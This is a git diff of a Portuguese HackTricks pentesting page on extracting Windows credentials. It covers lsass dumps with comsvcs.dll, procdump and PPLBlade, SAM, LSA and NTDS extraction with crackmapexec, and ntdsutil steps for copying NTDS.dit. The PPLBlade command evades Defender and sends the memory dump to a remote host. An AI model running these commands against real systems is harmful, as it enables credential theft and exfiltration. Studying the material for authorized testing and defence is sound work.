@@ -8,7 +8,7 @@
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -87,7 +87,7 @@ Este processo é feito automaticamente com o [SprayKatz](https://github.com/aas-
 
 Existe uma DLL chamada **comsvcs.dll**, localizada em `C:\Windows\System32`, que **faz dump da memória do processo** sempre que eles **falham**. Essa DLL contém uma **função** chamada **`MiniDumpW`** que é escrita para ser chamada com `rundll32.exe`.\
 Os dois primeiros argumentos não são utilizados, mas o terceiro é dividido em 3 partes. A primeira parte é o ID do processo que será feito o dump, a segunda parte é o local do arquivo de dump e a terceira parte é a palavra **full**. Não há outra opção.\
-Uma vez que esses 3 argumentos são analisados, basicamente essa DLL cria o arquivo de dump e faz o dump do processo especificado nesse arquivo de dump.\
+Uma vez que esses 3 argumentos foram analisados, basicamente essa DLL cria o arquivo de dump e faz o dump do processo especificado nesse arquivo de dump.\
 Graças a essa função, podemos usar a **comsvcs.dll** para fazer o dump do processo lsass em vez de fazer o upload do procdump e executá-lo. (Essa informação foi extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
 ```
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
@@ -110,19 +110,39 @@ Apenas precisamos ter em mente que essa técnica só pode ser executada como **S
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-CrackMapExec is a powerful tool used for penetration testing and security assessments. It allows you to perform various tasks, including dumping SAM hashes from Windows systems.
+## Dumpin lsass com PPLBlade
 
-To dump SAM hashes using CrackMapExec, you can use the following command:
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de processo protegido que suporta a obfuscação de despejo de memória e a transferência para estações de trabalho remotas sem deixá-lo no disco.
+
+**Funcionalidades principais**:
+
+1. Bypass de proteção PPL
+2. Obfuscação de arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinatura do Defender
+3. Upload de despejo de memória com métodos de upload RAW e SMB sem deixá-lo no disco (despejo sem arquivo)
+
+{% code overflow="wrap" %}
+```bash
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+```
+{% endcode %}
+
+## CrackMapExec
+
+### Extrair hashes do SAM
+
+O CrackMapExec é uma ferramenta poderosa que pode ser usada para extrair hashes do SAM em sistemas Windows. O SAM (Security Account Manager) é um banco de dados local que armazena as informações de autenticação dos usuários. Extrair os hashes do SAM pode ser útil para obter acesso às credenciais dos usuários e realizar ataques de força bruta ou ataques de pass-the-hash.
+
+Para extrair os hashes do SAM usando o CrackMapExec, você pode usar o seguinte comando:
 
 ```
 crackmapexec <target> -u <username> -p <password> --sam
 ```
 
-Replace `<target>` with the IP address or hostname of the target Windows system. `<username>` and `<password>` should be replaced with valid credentials that have administrative privileges on the target system.
+Substitua `<target>` pelo endereço IP ou nome do host do sistema Windows que você deseja atacar. `<username>` e `<password>` devem ser substituídos pelas credenciais válidas de um usuário com privilégios suficientes para acessar o SAM.
 
-When executed, this command will connect to the target system and dump the SAM hashes, which contain the password hashes for local user accounts. These hashes can be used for further analysis or cracking attempts.
+Depois de executar o comando, o CrackMapExec irá extrair os hashes do SAM e exibi-los na saída. Você pode então usar esses hashes para realizar ataques de força bruta ou ataques de pass-the-hash, dependendo do seu objetivo.
 
-It is important to note that dumping SAM hashes without proper authorization is illegal and unethical. This technique should only be used in controlled environments with proper permission and consent.
+É importante ressaltar que a extração de hashes do SAM é uma atividade ilegal, a menos que você tenha permissão explícita para fazê-lo em um ambiente controlado. Sempre obtenha permissão antes de realizar qualquer teste de penetração ou atividade de hacking.
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -140,11 +160,20 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 ### Extrair o NTDS.dit do DC de destino
 
-Para obter as credenciais armazenadas no Controlador de Domínio (DC) de destino, é necessário extrair o arquivo NTDS.dit. O NTDS.dit é o banco de dados do Active Directory que contém informações sobre usuários, grupos e outros objetos do domínio.
+Para roubar as credenciais de um controlador de domínio (DC) de destino, você precisa extrair o arquivo NTDS.dit. Esse arquivo contém o banco de dados do Active Directory, incluindo as informações de autenticação dos usuários.
 
-Para realizar essa extração, você pode usar ferramentas como o `ntdsutil` ou o `mimikatz`. Essas ferramentas permitem acessar o NTDS.dit e extrair as credenciais armazenadas nele.
+Para realizar essa extração, você pode usar ferramentas como o `ntdsutil` ou o `mimikatz`. Essas ferramentas permitem que você acesse o NTDS.dit e extraia as credenciais armazenadas nele.
 
-É importante ressaltar que a extração do NTDS.dit requer privilégios de administrador no DC de destino. Além disso, essa ação pode ser detectada pelos sistemas de segurança, portanto, é recomendável realizar essa atividade apenas em um ambiente controlado e autorizado, como durante um teste de penetração.
+Aqui está um exemplo de como usar o `ntdsutil` para extrair o NTDS.dit:
+
+1. Abra um prompt de comando com privilégios elevados no seu sistema.
+2. Digite `ntdsutil` e pressione Enter para abrir o utilitário.
+3. Digite `activate instance ntds` e pressione Enter para ativar a instância do NTDS.
+4. Digite `ifm` e pressione Enter para entrar no modo de gerenciamento de instância de arquivo.
+5. Digite `create full <caminho_do_destino>` e pressione Enter para criar uma cópia completa do NTDS.dit no local especificado.
+6. Aguarde até que o processo seja concluído e o arquivo NTDS.dit seja extraído.
+
+Depois de extrair o NTDS.dit, você pode usar ferramentas como o `mimikatz` para analisar o arquivo e obter as credenciais armazenadas nele. Lembre-se de que essas ações são ilegais e devem ser realizadas apenas em um ambiente controlado e com permissão adequada.
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -203,7 +232,7 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 Você pode realizar a cópia de arquivos protegidos usando esse serviço. Você precisa ser Administrador.
 
-#### Usando o vssadmin
+#### Usando vssadmin
 
 O binário vssadmin está disponível apenas nas versões do Windows Server.
 ```bash
@@ -324,8 +353,6 @@ Faça o download em: [http://www.tarasco.org/security/pwdump\_7](http://www.tara
 ## Defesas
 
 [**Aprenda sobre algumas proteções de credenciais aqui.**](credentials-protections.md)
-
-
 
 <details>
 
